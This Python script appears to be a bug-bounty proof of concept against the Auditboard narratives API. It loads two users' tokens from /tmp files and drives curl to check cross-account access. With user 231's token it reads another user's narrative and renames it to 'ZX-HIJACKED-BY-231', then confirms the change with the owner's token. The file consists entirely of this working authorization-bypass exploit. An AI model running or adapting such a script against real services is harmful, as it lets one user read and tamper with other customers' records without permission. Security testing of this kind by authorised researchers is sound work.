import json,subprocess,os
H=os.environ['H']; BB=os.environ['BB']
TA=open('/tmp/tok_A-231').read().strip()
TB=open('/tmp/tok_B-230').read().strip()
NID=open('/tmp/b_narr').read().strip()
def req(method,path,body=None,tok=None):
    cmd=['curl','-s','-m','60','-o','/tmp/b','-w','%{http_code}','-X',method,H+path,
         '-H','token: '+(tok or TA),'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
print(f"=== narrative {NID} owned by 230 ===")
print("\n-- B(230) baseline read --")
c,b=req('GET',f'/api/v1/narratives/{NID}',tok=TB)
try:
    n=json.loads(b)['narratives'][0]
    print(f"  {c} name={n.get('name')!r} scopes={json.dumps(n.get('scopes'))[:200]}")
    print(f"  owner_users={json.dumps(n.get('scopes',{}).get('owner_users'))[:200]}")
except Exception as e: print(f"  {c} {b[:250]}")
print("\n-- A(231) READ the same narrative --")
c,b=req('GET',f'/api/v1/narratives/{NID}',tok=TA)
print(f"  {c} {b[:300].replace(chr(10),' ')}")
print("\n-- A(231) EDIT the same narrative --")
c,b=req('PUT',f'/api/v1/narratives/{NID}',{"narrative":{"name":"ZX-HIJACKED-BY-231"}},tok=TA)
print(f"  {c} {b[:300].replace(chr(10),' ')}")
print("\n-- verify: B(230) reads back --")
c,b=req('GET',f'/api/v1/narratives/{NID}',tok=TB)
try:
    n=json.loads(b)['narratives'][0]
    print(f"  {c} name={n.get('name')!r}")
except Exception as e: print(f"  {c} {b[:200]}")
